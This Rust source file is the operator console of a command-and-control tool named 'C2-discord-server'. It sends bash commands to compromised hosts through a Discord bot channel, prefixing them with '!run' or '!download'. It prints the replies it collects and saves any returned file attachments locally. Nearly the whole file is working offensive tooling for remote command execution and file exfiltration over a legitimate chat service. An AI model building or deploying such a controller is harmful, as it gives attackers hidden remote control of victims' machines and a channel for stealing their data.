use dotenv::dotenv;
use std::{
    env,
    io::{self, Write},
};
use serenity::all::Ready;
use serenity::async_trait;
use serenity::model::id::ChannelId;
use serenity::collector::MessageCollector;
use serenity::futures::StreamExt;
use serenity::prelude::*;
use tokio::fs::File;
use tokio::io::AsyncWriteExt;

struct Handler;

#[async_trait]
impl EventHandler for Handler {
    async fn ready(&self, ctx: Context, ready: Ready) {
        println!("{} is connected!", ready.user.name);
        let channel_id = ChannelId::new(
            env::var("DISCORD_CHANEL_ID")
                .expect("Expected a channel id in the environment, see .env.example")
                .parse()
                .expect("Failed to parse channel id"),
        );

        println!("\nWelcome to C2-discord-server: enter bash commands below.\n");

        loop {
            print!("c2-discord-client $ ");
            io::stdout().flush().expect("Failed to flush stdout");

            let mut input_command = String::new();
            match io::stdin().read_line(&mut input_command) {
                Ok(_) => {
                    if input_command.trim().is_empty() {
                        continue;
                    }

                    match channel_id.say(&ctx.http, parse_command(&input_command)).await {
                        Ok(_) => {
                            // Collect the next message from Discord
                            let msg = MessageCollector::new(&ctx)
                                .channel_id(channel_id)
                                .stream()
                                .next().await.unwrap();
                            println!("{}", parse_response(&msg.content));

                            if msg.attachments.is_empty() {
                                println!("No attachments found");
                                continue;
                            }

                            for attachment in &msg.attachments {
                                let content = match attachment.download().await {
                                    Ok(content) => content,
                                    Err(e) => {
                                        eprintln!("Failed to download attachment: {}", e);
                                        continue;
                                    }
                                };

                                let mut file = match File::create(&attachment.filename).await {
                                    Ok(file) => file,
                                    Err(why) => {
                                        println!("Error creating file: {:?}", why);
                                        return
                                    },
                                };

                                if let Err(why) = file.write_all(&content).await {
                                    println!("Error writing to file: {:?}", why);

                                    return;
                                }
                            }
                        },
                        Err(e) => eprintln!("Failed to send message: {}", e),
                    }
                }
                Err(e) => println!("Failed to read input: {}", e),
            }
        }
    }
}

#[tokio::main]
async fn main() {
    dotenv().ok(); // load .env file into environment variables

    // Login with a bot token from the environment
    let token = env::var("DISCORD_TOKEN").expect("Expected a token in the environment");
    // Set gateway intents, which decides what events the bot will be notified about
    let intents = GatewayIntents::GUILD_MESSAGES
        | GatewayIntents::DIRECT_MESSAGES
        | GatewayIntents::MESSAGE_CONTENT;

    // Create a new instance of the Client, logging in as a bot.
    let mut client =
        Client::builder(&token, intents).event_handler(Handler).await.expect("Err creating client");

    // Start listening for events by starting a single shard
    if let Err(why) = client.start().await {
        println!("Client error: {why:?}");
    }
}

/**
 * Parse the message to delete "Output" and "```".
 */
fn parse_response(res: &str) -> String {
    res
        .replace("Output:", "")
        .replace("```bash", "")
        .replace("```", "")
        .replace("Here is", "Please find in you current directory")
        .trim()
        .to_string()
}

fn parse_command(cmd: &str) -> String {
    if cmd.trim().starts_with("!download") {
        cmd.trim().to_string()
    } else {
        format!("!run {}", cmd.trim())
    }
}


